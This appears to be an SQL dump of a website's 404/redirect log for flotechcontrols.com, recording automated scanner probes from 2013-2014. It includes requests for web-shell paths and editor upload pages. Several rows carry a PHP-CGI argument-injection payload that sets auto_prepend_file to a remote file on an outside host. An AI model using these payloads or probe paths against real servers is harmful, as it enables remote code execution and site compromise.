(76, 'http://www.flotechcontrols.com/test//wp-login.php', '', '', '', 1, 0, '2013-11-08 11:41:31', '0000-00-00 00:00:00'),
(77, 'http://www.flotechcontrols.com/site//wp-login.php', '', '', '', 1, 0, '2013-11-08 11:41:32', '0000-00-00 00:00:00'),
(78, 'http://www.flotechcontrols.com/main//wp-login.php', '', '', '', 1, 0, '2013-11-08 11:41:33', '0000-00-00 00:00:00'),
(79, 'http://www.flotechcontrols.com/shop//wp-login.php', '', '', '', 1, 0, '2013-11-08 11:41:34', '0000-00-00 00:00:00'),
(80, 'http://www.flotechcontrols.com/store//wp-login.php', '', '', '', 1, 0, '2013-11-08 11:41:35', '0000-00-00 00:00:00'),
(81, 'http://FLOTECHCONTROLS.COM//wp-login.php', '', '', '', 1, 0, '2013-11-08 20:42:47', '0000-00-00 00:00:00'),
(82, 'http://www.flotechcontrols.com/text/javascript', '', '', '', 1, 0, '2013-11-09 00:43:25', '0000-00-00 00:00:00'),
(83, 'http://www.flotechcontrols.com/non-null/undefined', '', '', '', 1, 0, '2013-11-09 00:43:26', '0000-00-00 00:00:00'),
(84, 'http://www.flotechcontrols.com/DOMready/load', '', '', '', 1, 0, '2013-11-09 00:43:27', '0000-00-00 00:00:00'),
(85, 'http://www.flotechcontrols.com/leading/trailing', '', '', '', 1, 0, '2013-11-09 00:43:27', '0000-00-00 00:00:00'),
(86, 'http://www.flotechcontrols.com/text/xml', '', '', '', 1, 0, '2013-11-09 00:43:28', '0000-00-00 00:00:00'),
(87, 'http://www.flotechcontrols.com/value/s', '', '', '', 1, 0, '2013-11-09 00:43:29', '0000-00-00 00:00:00'),
(88, 'http://www.flotechcontrols.com/a', '', '', '', 1, 0, '2013-11-09 00:43:30', '0000-00-00 00:00:00'),
(89, 'http://www.flotechcontrols.com/get/setAttribute', '', '', '', 1, 0, '2013-11-09 00:43:31', '0000-00-00 00:00:00'),
(90, 'http://www.flotechcontrols.com/offsetWidth/Height', '', '', '', 1, 0, '2013-11-09 00:43:31', '0000-00-00 00:00:00'),
(91, 'http://www.flotechcontrols.com/key/value', '', '', '', 1, 0, '2013-11-09 00:43:32', '0000-00-00 00:00:00'),
(92, 'http://www.flotechcontrols.com/mark/queue', '', '', '', 1, 0, '2013-11-09 00:43:33', '0000-00-00 00:00:00'),
(93, 'http://www.flotechcontrols.com/try/catch', '', '', '', 1, 0, '2013-11-09 00:43:33', '0000-00-00 00:00:00'),
(94, 'http://www.flotechcontrols.com/null/undef', '', '', '', 1, 0, '2013-11-09 00:43:34', '0000-00-00 00:00:00'),
(95, 'http://www.flotechcontrols.com/null/undefined', '', '', '', 1, 0, '2013-11-09 00:43:35', '0000-00-00 00:00:00'),
(96, 'http://www.flotechcontrols.com/get/set', '', '', '', 1, 0, '2013-11-09 00:43:35', '0000-00-00 00:00:00'),
(97, 'http://www.flotechcontrols.com/getting/setting', '', '', '', 1, 0, '2013-11-09 00:43:43', '0000-00-00 00:00:00'),
(98, 'http://www.flotechcontrols.com/getter/setter', '', '', '', 1, 0, '2013-11-09 00:43:43', '0000-00-00 00:00:00'),
(99, 'http://www.flotechcontrols.com/text/comment', '', '', '', 1, 0, '2013-11-09 00:43:44', '0000-00-00 00:00:00'),
(100, 'http://www.flotechcontrols.com/find/remove', '', '', '', 1, 0, '2013-11-09 00:43:45', '0000-00-00 00:00:00'),
(101, 'http://www.flotechcontrols.com/addEventListener/attachEvent', '', '', '', 1, 0, '2013-11-09 00:43:45', '0000-00-00 00:00:00'),
(102, 'http://www.flotechcontrols.com/focus/blur', '', '', '', 1, 0, '2013-11-09 00:43:46', '0000-00-00 00:00:00'),
(103, 'http://www.flotechcontrols.com/focusin/out', '', '', '', 1, 0, '2013-11-09 00:43:47', '0000-00-00 00:00:00'),
(104, 'http://www.flotechcontrols.com/pageX/Y', '', '', '', 1, 0, '2013-11-09 00:43:47', '0000-00-00 00:00:00'),
(105, 'http://www.flotechcontrols.com/clientX/Y', '', '', '', 1, 0, '2013-11-09 00:43:48', '0000-00-00 00:00:00'),
(106, 'http://www.flotechcontrols.com/mouse/key', '', '', '', 1, 0, '2013-11-09 00:43:50', '0000-00-00 00:00:00'),
(107, 'http://www.flotechcontrols.com/undocumented/deprecated', '', '', '', 1, 0, '2013-11-09 00:43:50', '0000-00-00 00:00:00'),
(108, 'http://www.flotechcontrols.com/mouseenter/leave', '', '', '', 1, 0, '2013-11-09 00:43:51', '0000-00-00 00:00:00'),
(109, 'http://www.flotechcontrols.com/mouseover/out', '', '', '', 1, 0, '2013-11-09 00:43:51', '0000-00-00 00:00:00'),
(110, 'http://www.flotechcontrols.com/mousenter/leave', '', '', '', 1, 0, '2013-11-09 00:43:52', '0000-00-00 00:00:00'),
(111, 'http://www.flotechcontrols.com/left/entered', '', '', '', 1, 0, '2013-11-09 00:43:52', '0000-00-00 00:00:00'),
(112, 'http://www.flotechcontrols.com/checkbox/radio', '', '', '', 1, 0, '2013-11-09 00:43:53', '0000-00-00 00:00:00'),
(113, 'http://www.flotechcontrols.com/check/radio', '', '', '', 1, 0, '2013-11-09 00:43:53', '0000-00-00 00:00:00'),
(114, 'http://www.flotechcontrols.com/focusin/focusout', '', '', '', 1, 0, '2013-11-09 00:43:54', '0000-00-00 00:00:00'),
(115, 'http://www.flotechcontrols.com/types/handlers', '', '', '', 1, 0, '2013-11-09 00:43:54', '0000-00-00 00:00:00'),
(116, 'http://www.flotechcontrols.com/brackets/parens', '', '', '', 1, 0, '2013-11-09 00:43:55', '0000-00-00 00:00:00'),
(117, 'http://www.flotechcontrols.com/change/submit', '', '', '', 1, 0, '2013-11-09 00:43:55', '0000-00-00 00:00:00'),
(118, 'http://www.flotechcontrols.com/in/out', '', '', '', 1, 0, '2013-11-09 00:43:59', '0000-00-00 00:00:00'),
(119, 'http://www.flotechcontrols.com/application/x-www-form-urlencoded', '', '', '', 1, 0, '2013-11-09 00:44:00', '0000-00-00 00:00:00'),
(120, 'http://www.flotechcontrols.com/text/html', '', '', '', 1, 0, '2013-11-09 00:44:01', '0000-00-00 00:00:00'),
(121, 'http://www.flotechcontrols.com/text/plain', '', '', '', 1, 0, '2013-11-09 00:44:02', '0000-00-00 00:00:00'),
(122, 'http://www.flotechcontrols.com/json/', '', '', '', 1, 0, '2013-11-09 00:44:03', '0000-00-00 00:00:00'),
(123, 'http://www.flotechcontrols.com/and/or', '', '', '', 1, 0, '2013-11-09 00:44:05', '0000-00-00 00:00:00'),
(124, 'http://www.flotechcontrols.com/Success/Error', '', '', '', 1, 0, '2013-11-09 00:44:07', '0000-00-00 00:00:00'),
(125, 'http://www.flotechcontrols.com/headers/mimetypes', '', '', '', 1, 0, '2013-11-09 00:44:09', '0000-00-00 00:00:00'),
(126, 'http://www.flotechcontrols.com/key/values', '', '', '', 1, 0, '2013-11-09 00:44:11', '0000-00-00 00:00:00'),
(127, 'http://www.flotechcontrols.com/application/x-ecmascript', '', '', '', 1, 0, '2013-11-09 00:44:13', '0000-00-00 00:00:00'),
(128, 'http://www.flotechcontrols.com/javascript', '', '', '', 1, 0, '2013-11-09 00:44:15', '0000-00-00 00:00:00'),
(129, 'http://www.flotechcontrols.com/ecmascript/', '', '', '', 1, 0, '2013-11-09 00:44:17', '0000-00-00 00:00:00'),
(130, 'http://www.flotechcontrols.com/loaded', '', '', '', 1, 0, '2013-11-09 00:44:19', '0000-00-00 00:00:00'),
(131, 'http://www.flotechcontrols.com/IE7/IE8', '', '', '', 1, 0, '2013-11-09 00:44:21', '0000-00-00 00:00:00'),
(132, 'http://www.flotechcontrols.com/height/width', '', '', '', 1, 0, '2013-11-09 00:44:23', '0000-00-00 00:00:00'),
(133, 'http://www.flotechcontrols.com/width/height', '', '', '', 1, 0, '2013-11-09 00:44:25', '0000-00-00 00:00:00'),
(134, 'http://www.flotechcontrols.com/true/undefined/null', '', '', '', 1, 0, '2013-11-09 00:44:27', '0000-00-00 00:00:00'),
(135, 'http://www.flotechcontrols.com/top/left', '', '', '', 1, 0, '2013-11-09 00:44:29', '0000-00-00 00:00:00'),
(136, 'http://www.flotechcontrols.com/about-us/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:00', '0000-00-00 00:00:00'),
(137, 'http://www.flotechcontrols.com/contact-us/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:02', '0000-00-00 00:00:00'),
(138, 'http://www.flotechcontrols.com/IE6/7/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:04', '0000-00-00 00:00:00'),
(139, 'http://www.flotechcontrols.com/6/7/8/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:06', '0000-00-00 00:00:00'),
(140, 'http://www.flotechcontrols.com/6/7/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:08', '0000-00-00 00:00:00'),
(141, 'http://www.flotechcontrols.com/IE6/7/8/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:10', '0000-00-00 00:00:00'),
(142, 'http://www.flotechcontrols.com/products/red-valve/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:12', '0000-00-00 00:00:00'),
(143, 'http://www.flotechcontrols.com/products/tideflex/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:14', '0000-00-00 00:00:00'),
(144, 'http://www.flotechcontrols.com/products/wey/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:16', '0000-00-00 00:00:00'),
(145, 'http://www.flotechcontrols.com/products/noreva/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:18', '0000-00-00 00:00:00'),
(146, 'http://www.flotechcontrols.com/products/valvtechnologies/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:20', '0000-00-00 00:00:00'),
(147, 'http://www.flotechcontrols.com/products/birkett/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:22', '0000-00-00 00:00:00'),
(148, 'http://www.flotechcontrols.com/products/sor/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:24', '0000-00-00 00:00:00'),
(149, 'http://www.flotechcontrols.com/products/mts/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:26', '0000-00-00 00:00:00'),
(150, 'http://www.flotechcontrols.com/products/copes/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:28', '0000-00-00 00:00:00'),
(151, 'http://www.flotechcontrols.com/application-sectors/power/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:30', '0000-00-00 00:00:00'),
(152, 'http://www.flotechcontrols.com/application-sectors/water/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:32', '0000-00-00 00:00:00'),
(153, 'http://www.flotechcontrols.com/application-sectors/mining/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:34', '0000-00-00 00:00:00'),
(154, 'http://www.flotechcontrols.com/application-sectors/oil-and-gas/text/javascript', '', '', '', 1, 0, '2013-11-09 00:45:36', '0000-00-00 00:00:00'),
(155, 'http://www.flotechcontrols.com:80/calendar/install/index.php', '', '', '', 1, 0, '2013-11-11 05:25:03', '0000-00-00 00:00:00'),
(156, 'http://www.flotechcontrols.com:80/cal/install/index.php', '', '', '', 1, 0, '2013-11-11 05:25:04', '0000-00-00 00:00:00'),
(157, 'http://www.flotechcontrols.com:80/event/install/index.php', '', '', '', 1, 0, '2013-11-11 05:25:06', '0000-00-00 00:00:00'),
(158, 'http://www.flotechcontrols.com:80/events/install/index.php', '', '', '', 1, 0, '2013-11-11 05:25:06', '0000-00-00 00:00:00'),
(159, 'http://www.flotechcontrols.com:80/fbcalendar/install/index.php', '', '', '', 1, 0, '2013-11-11 05:25:07', '0000-00-00 00:00:00'),
(160, 'http://www.flotechcontrols.com:80/install/index.php', '', '', '', 1, 0, '2013-11-11 05:25:08', '0000-00-00 00:00:00'),
(161, 'http://www.flotechcontrols.com:80/menu/install/index.php', '', '', '', 1, 0, '2013-11-11 05:25:08', '0000-00-00 00:00:00'),
(162, 'http://www.flotechcontrols.com:80/schedule/install/index.php', '', '', '', 1, 0, '2013-11-11 05:25:09', '0000-00-00 00:00:00'),
(163, 'http://www.flotechcontrols.com:80/webcalendar/install/index.php', '', '', '', 1, 0, '2013-11-11 05:25:09', '0000-00-00 00:00:00'),
(164, 'http://www.flotechcontrols.com:80/webcal/install/index.php', '', '', '', 1, 0, '2013-11-11 05:25:11', '0000-00-00 00:00:00'),
(165, 'http://www.flotechcontrols.com:80/web/install/index.php', '', '', '', 1, 0, '2013-11-11 05:25:13', '0000-00-00 00:00:00'),
(166, 'http://www.flotechcontrols.com/plugins/editors/jce.php', '', '', '', 1, 0, '2013-11-13 07:55:39', '0000-00-00 00:00:00'),
(167, 'http://www.flotechcontrols.com/accepted-WebTac_Notify?aHR0cDovL3d3dy5mbG90ZWNoY29udHJvbHMuY29tL2Fib3V0LXVz', '', 'http://www.flotechcontrols.com/notify-WebTac_Notify?aHR0cDovL3d3dy5mbG90ZWNoY29udHJvbHMuY29tL2Fib3V0LXVz', '', 1, 0, '2013-11-13 21:02:40', '0000-00-00 00:00:00'),
(168, 'http://www.flotechcontrols.com/verify-WebTac_Notify?aHR0cDovL3d3dy5mbG90ZWNoY29udHJvbHMuY29tL2Fib3V0LXVz', '', 'http://www.flotechcontrols.com/notify-WebTac_Notify?aHR0cDovL3d3dy5mbG90ZWNoY29udHJvbHMuY29tL2Fib3V0LXVz', '', 1, 0, '2013-11-13 21:02:41', '0000-00-00 00:00:00'),
(169, 'http://flotechcontrols.com/plugins/editors/fckeditor/editor/filemanager/browser/default/browser.html', '', 'http://google.com', '', 1, 0, '2013-11-15 10:31:52', '0000-00-00 00:00:00'),
(170, 'http://www.flotechcontrols.com/plugins/editors/fckeditor/editor/filemanager/browser/default/browser.html', '', 'http://google.com', '', 1, 0, '2013-11-15 10:31:56', '0000-00-00 00:00:00'),
(171, 'http://www.flotechcontrols.com/Fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2013-12-02 02:08:05', '0000-00-00 00:00:00'),
(172, 'http://www.flotechcontrols.com/editor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2013-12-02 02:08:05', '0000-00-00 00:00:00'),
(173, 'http://www.flotechcontrols.com/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2013-12-02 02:08:05', '0000-00-00 00:00:00'),
(174, 'http://www.flotechcontrols.com/Fckeditor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2013-12-02 02:08:08', '0000-00-00 00:00:00'),
(175, 'http://www.flotechcontrols.com/admin/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2013-12-02 02:08:08', '0000-00-00 00:00:00'),
(176, 'http://www.flotechcontrols.com/admin/FCKeditor/editor/filemanager/upload/test.html', '', '', '', 1, 0, '2013-12-02 02:08:08', '0000-00-00 00:00:00'),
(177, 'http://www.flotechcontrols.com/admin/fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2013-12-02 02:08:14', '0000-00-00 00:00:00'),
(178, 'http://www.flotechcontrols.com/editor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2013-12-02 02:08:14', '0000-00-00 00:00:00'),
(179, 'http://www.flotechcontrols.com/flotech', '', '', '', 1, 0, '2013-12-03 04:13:38', '0000-00-00 00:00:00'),
(180, 'http://flotechcontrols.com/pma/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt', '', '', '', 1, 0, '2013-12-14 19:58:57', '0000-00-00 00:00:00'),
(181, 'http://flotechcontrols.com/admin/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt', '', '', '', 1, 0, '2013-12-14 19:59:00', '0000-00-00 00:00:00'),
(182, 'http://flotechcontrols.com/login/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt', '', '', '', 1, 0, '2013-12-14 19:59:01', '0000-00-00 00:00:00'),
(183, 'http://flotechcontrols.com/forum/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt', '', '', '', 1, 0, '2013-12-14 19:59:02', '0000-00-00 00:00:00'),
(184, 'http://flotechcontrols.com/do.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt', '', '', '', 1, 0, '2013-12-14 19:59:04', '0000-00-00 00:00:00'),
(185, 'http://flotechcontrols.com/news.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt', '', '', '', 1, 0, '2013-12-14 19:59:04', '0000-00-00 00:00:00'),
(186, 'http://flotechcontrols.com/mail.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt', '', '', '', 1, 0, '2013-12-14 19:59:05', '0000-00-00 00:00:00'),
(187, 'http://flotechcontrols.com/webmail/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt', '', '', '', 1, 0, '2013-12-14 19:59:05', '0000-00-00 00:00:00'),
(188, 'http://flotechcontrols.com/mail/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt', '', '', '', 1, 0, '2013-12-14 19:59:06', '0000-00-00 00:00:00'),
(189, 'http://www.flotechcontrols.com/applic', '', '', '', 1, 0, '2013-12-19 07:25:19', '0000-00-00 00:00:00'),
(190, 'http://FLOTECHCONTROLS.com/wp-content/themes/ColdFusion/includes/uploadify/upload_settings_image.php', '', '', '', 1, 0, '2013-12-20 22:47:02', '0000-00-00 00:00:00'),
(191, 'http://flotechcontrols.com/modules/mod_dbrestore/mod_dbrestore.php', '', '', '', 1, 0, '2013-12-22 22:54:59', '0000-00-00 00:00:00'),
(192, 'http://www.flotechcontrols.com/admin', '', '', '', 1, 0, '2013-12-24 19:59:43', '0000-00-00 00:00:00'),
(193, 'http://flotechcontrols.com/modules/mod_seolinks/mod_seolinks.php', '', '', '', 1, 0, '2013-12-25 00:58:18', '0000-00-00 00:00:00'),
(194, 'http://flotechcontrols.com/modules/mod_ya/mod_ya.php', '', '', '', 1, 0, '2013-12-25 10:03:49', '0000-00-00 00:00:00'),
(195, 'http://flotechcontrols.com/modules/mod_xsystem/mod_xsystem.php', '', '', '', 1, 0, '2013-12-26 02:12:35', '0000-00-00 00:00:00'),
(196, 'http://flotechcontrols.com/components/com_jooomlas/xyxz.php', '', '', '', 1, 0, '2013-12-26 15:00:24', '0000-00-00 00:00:00'),
(197, 'http://flotechcontrols.com/cache/sok/sok.php', '', '', '', 1, 0, '2013-12-27 02:41:05', '0000-00-00 00:00:00'),
(198, 'http://flotechcontrols.com/user', '', 'flotechcontrols.com', '', 1, 0, '2013-12-29 20:38:27', '0000-00-00 00:00:00'),
(199, 'http://flotechcontrols.com/blog/wp-login.php', '', '', '', 1, 0, '2014-01-02 03:49:02', '0000-00-00 00:00:00'),
(200, 'http://flotechcontrols.com/cahce/index.html', '', '', '', 1, 0, '2014-01-05 19:03:46', '0000-00-00 00:00:00'),
(201, 'http://flotechcontrols.com/modules/mod_araticlhess/mod_araticlhess.php', '', '', '', 1, 0, '2014-01-05 22:31:02', '0000-00-00 00:00:00'),
(202, 'http://flotechcontrols.com/modules/mod_cmsfix/mod_cmsfix.php', '', '', '', 1, 0, '2014-01-06 06:34:49', '0000-00-00 00:00:00'),
(203, 'http://flotechcontrols.com/modules/mod_googleapi/mod_googleapi.php', '', '', '', 1, 0, '2014-01-06 20:16:54', '0000-00-00 00:00:00'),
(204, 'http://flotechcontrols.com/modules/mod_backup2/mod_backup2.php', '', '', '', 1, 0, '2014-01-07 11:18:44', '0000-00-00 00:00:00'),
(205, 'http://flotechcontrols.com/components/com_rokdownloads/closelog.php', '', '', '', 1, 0, '2014-01-08 00:17:55', '0000-00-00 00:00:00'),
(206, 'http://flotechcontrols.com/administrator/components/com_aceftp/quixplorer/index.php', '', '', '', 1, 0, '2014-01-09 02:30:45', '0000-00-00 00:00:00'),
(207, 'http://flotechcontrols.com/products/birkett/wp-login.php', '', '', '', 1, 0, '2014-01-09 05:49:50', '0000-00-00 00:00:00'),
(208, 'http://flotechcontrols.com/products/valvtechnologies/wp-login.php', '', '', '', 1, 0, '2014-01-09 05:49:50', '0000-00-00 00:00:00'),
(209, 'http://flotechcontrols.com/templates-xss.php', '', '', '', 1, 0, '2014-01-09 15:40:01', '0000-00-00 00:00:00'),
(210, 'http://flotechcontrols.com/components/com_banners/helpers/sys.php', '', '', '', 1, 0, '2014-01-10 00:17:41', '0000-00-00 00:00:00'),
(211, 'http://flotechcontrols.com/modules/mod_add/mod_add.php', '', '', '', 1, 0, '2014-01-10 06:19:23', '0000-00-00 00:00:00'),
(212, 'http://www.flotechcontrols.com/contact.htm', '', '', '', 1, 0, '2014-01-10 07:06:54', '0000-00-00 00:00:00'),
(213, 'http://www.flotechcontrols.com/contact.php', '', '', '', 1, 0, '2014-01-10 07:06:54', '0000-00-00 00:00:00'),
(214, 'http://www.flotechcontrols.com/contact', '', '', '', 1, 0, '2014-01-10 07:06:55', '0000-00-00 00:00:00'),
(215, 'http://www.flotechcontrols.com/contactus.html', '', '', '', 1, 0, '2014-01-10 07:06:56', '0000-00-00 00:00:00'),
(216, 'http://www.flotechcontrols.com/contactus.htm', '', '', '', 1, 0, '2014-01-10 07:06:56', '0000-00-00 00:00:00'),
(217, 'http://www.flotechcontrols.com/contactus.php', '', '', '', 1, 0, '2014-01-10 07:06:56', '0000-00-00 00:00:00'),
(218, 'http://www.flotechcontrols.com/contactus', '', '', '', 1, 0, '2014-01-10 07:06:57', '0000-00-00 00:00:00'),
(219, 'http://www.flotechcontrols.com/contact_us.html', '', '', '', 1, 0, '2014-01-10 07:06:58', '0000-00-00 00:00:00'),
(220, 'http://www.flotechcontrols.com/contact_us.htm', '', '', '', 1, 0, '2014-01-10 07:06:58', '0000-00-00 00:00:00'),
(221, 'http://www.flotechcontrols.com/contact_us.php', '', '', '', 1, 0, '2014-01-10 07:06:59', '0000-00-00 00:00:00'),
(222, 'http://www.flotechcontrols.com/contact_us', '', '', '', 1, 0, '2014-01-10 07:06:59', '0000-00-00 00:00:00'),
(223, 'http://www.flotechcontrols.com/contacts.html', '', '', '', 1, 0, '2014-01-10 07:07:00', '0000-00-00 00:00:00'),
(224, 'http://www.flotechcontrols.com/contacts.htm', '', '', '', 1, 0, '2014-01-10 07:07:00', '0000-00-00 00:00:00'),
(225, 'http://www.flotechcontrols.com/contacts.php', '', '', '', 1, 0, '2014-01-10 07:07:01', '0000-00-00 00:00:00'),
(226, 'http://www.flotechcontrols.com/contacts', '', '', '', 1, 0, '2014-01-10 07:07:01', '0000-00-00 00:00:00'),
(227, 'http://www.flotechcontrols.com/contact-us.html', '', '', '', 1, 0, '2014-01-10 07:07:02', '0000-00-00 00:00:00'),
(228, 'http://www.flotechcontrols.com/contact-us.htm', '', '', '', 1, 0, '2014-01-10 07:07:02', '0000-00-00 00:00:00'),
(229, 'http://www.flotechcontrols.com/contact-us.php', '', '', '', 1, 0, '2014-01-10 07:07:03', '0000-00-00 00:00:00'),
(230, 'http://flotechcontrols.com/media/system/images/gallery.php', '', '', '', 1, 0, '2014-01-10 20:00:09', '0000-00-00 00:00:00'),
(231, 'http://flotechcontrols.com/administrator/xbczmsd.php', '', '', '', 1, 0, '2014-01-11 21:01:51', '0000-00-00 00:00:00'),
(232, 'http://flotechcontrols.com/plugins/system/captcha/captcha.php', '', '', '', 1, 0, '2014-01-12 08:05:25', '0000-00-00 00:00:00'),
(233, 'http://flotechcontrols.com/administrator/fix.php', '', '', '', 1, 0, '2014-01-12 10:49:46', '0000-00-00 00:00:00'),
(234, 'http://flotechcontrols.com/includes/templates.php', '', '', '', 1, 0, '2014-01-12 21:43:08', '0000-00-00 00:00:00'),
(235, 'http://flotechcontrols.com/administrator/components/com_akeeba/views/postsetup/ds3uig.php', '', '', '', 1, 0, '2014-01-13 06:46:10', '0000-00-00 00:00:00'),
(236, 'http://flotechcontrols.com/modules/mod_media_style/mod_media_style.php', '', '', '', 1, 0, '2014-01-13 18:00:32', '0000-00-00 00:00:00'),
(237, 'http://flotechcontrols.com/modules/mod_apis/mod_apis.php', '', '', '', 1, 0, '2014-01-14 10:24:02', '0000-00-00 00:00:00'),
(238, 'http://www.flotechcontrols.com/accepted-Flag1-User_Notified?aHR0cDovL3d3dy5mbG90ZWNoY29udHJvbHMuY29tL3Byb2R1Y3RzL2JpcmtldHQ=', '', 'http://www.flotechcontrols.com/notify-Flag1-User_Notified?aHR0cDovL3d3dy5mbG90ZWNoY29udHJvbHMuY29tL3Byb2R1Y3RzL2JpcmtldHQ=', '', 1, 0, '2014-01-16 17:26:18', '0000-00-00 00:00:00'),
(239, 'http://www.flotechcontrols.com/verify-Flag1-User_Notified?aHR0cDovL3d3dy5mbG90ZWNoY29udHJvbHMuY29tL3Byb2R1Y3RzL2JpcmtldHQ=', '', 'http://www.flotechcontrols.com/notify-Flag1-User_Notified?aHR0cDovL3d3dy5mbG90ZWNoY29udHJvbHMuY29tL3Byb2R1Y3RzL2JpcmtldHQ=', '', 1, 0, '2014-01-16 17:26:19', '0000-00-00 00:00:00'),
(240, 'http://www.flotechcontrols.comhttp//www.flotechcontrols.com/contact-us', '', 'http://www.flotechcontrols.com/contact-us', '', 1, 0, '2014-01-19 22:54:05', '0000-00-00 00:00:00'),
(241, 'http://www.flotechcontrols.com/Fckeditor/_whatsnew.html', '', '', '', 1, 0, '2014-01-23 16:02:39', '0000-00-00 00:00:00'),
(242, 'http://www.flotechcontrols.com/(url/(', '', '', '', 1, 0, '2014-01-27 07:30:14', '0000-00-00 00:00:00'),
(243, 'http://www.flotechcontrols.com/media/system/js/c.html', '', '', '', 1, 0, '2014-01-27 07:30:18', '0000-00-00 00:00:00'),
(244, 'http://www.flotechcontrols.com/media/system/js/:/', '', '', '', 1, 0, '2014-01-27 07:30:18', '0000-00-00 00:00:00'),
(245, 'http://www.flotechcontrols.com/media/jui/js/vt,n%3D/', '', '', '', 1, 0, '2014-01-27 07:30:20', '0000-00-00 00:00:00'),
(246, 'http://www.flotechcontrols.com/media/jui/js/http:/', '', '', '', 1, 0, '2014-01-27 07:30:21', '0000-00-00 00:00:00'),
(247, 'http://www.flotechcontrols.com/media/jui/js/*/', '', '', '', 1, 0, '2014-01-27 07:30:21', '0000-00-00 00:00:00'),
(248, 'http://www.flotechcontrols.com/(element(s', '', '', '', 1, 0, '2014-01-27 07:30:23', '0000-00-00 00:00:00'),
(249, 'http://www.flotechcontrols.com/4h/t/', '', '', '', 1, 0, '2014-01-27 07:30:25', '0000-00-00 00:00:00'),
(250, 'http://www.flotechcontrols.com/media/jui/js/k.test(q.html', '', '', '', 1, 0, '2014-01-27 07:30:26', '0000-00-00 00:00:00'),
(251, 'http://flotechcontrols.com/myadmin/scripts/setup.php', '', 'http://flotechcontrols.com/myadmin/scripts/setup.php', '', 1, 0, '2014-01-29 10:37:45', '0000-00-00 00:00:00'),
(252, 'http://flotechcontrols.com/pma/scripts/setup.php', '', 'http://flotechcontrols.com/pma/scripts/setup.php', '', 1, 0, '2014-01-29 10:37:45', '0000-00-00 00:00:00'),
(253, 'http://flotechcontrols.com/admin123', '', '', '', 1, 0, '2014-02-01 19:22:01', '0000-00-00 00:00:00'),
(254, 'http://flotechcontrols.com/components/com_jmultimedia/assets/thumbs/phpthumb/fonts/index.html', '', '', '', 1, 0, '2014-02-05 23:50:11', '0000-00-00 00:00:00'),
(255, 'http://flotechcontrols.com/components/com_flexicontent/librairies/phpthumb/fonts/index.html', '', '', '', 1, 0, '2014-02-05 23:50:12', '0000-00-00 00:00:00'),
(256, 'http://flotechcontrols.com/components/com_hotornot2/phpthumb/fonts/index.html', '', '', '', 1, 0, '2014-02-05 23:50:13', '0000-00-00 00:00:00'),
(257, 'http://flotechcontrols.com/components/com_portfolio/includes/phpthumb/fonts/index.html', '', '', '', 1, 0, '2014-02-05 23:50:13', '0000-00-00 00:00:00'),
(258, 'http://flotechcontrols.com/components/com_alphauserpoints/assets/phpthumb/fonts/index.html', '', '', '', 1, 0, '2014-02-05 23:50:14', '0000-00-00 00:00:00'),
(259, 'http://flotechcontrols.com/components/com_community/index.html', '', '', '', 1, 0, '2014-02-06 13:29:38', '0000-00-00 00:00:00'),
(260, 'http://flotechcontrols.com/components/com_virtuemart/virtuemart.php', '', '', '', 1, 0, '2014-02-11 02:47:21', '0000-00-00 00:00:00'),
(261, 'http://FLOTECHCONTROLS.COM/sites/all/modules/fckeditor/fckeditor/editor/filemanager/connectors/uploadtest.html', '', 'http://FLOTECHCONTROLS.COM/sites/all/modules/fckeditor/fckeditor/editor/filemanager/connectors/uploadtest.html', '', 1, 0, '2014-02-12 00:36:00', '0000-00-00 00:00:00'),
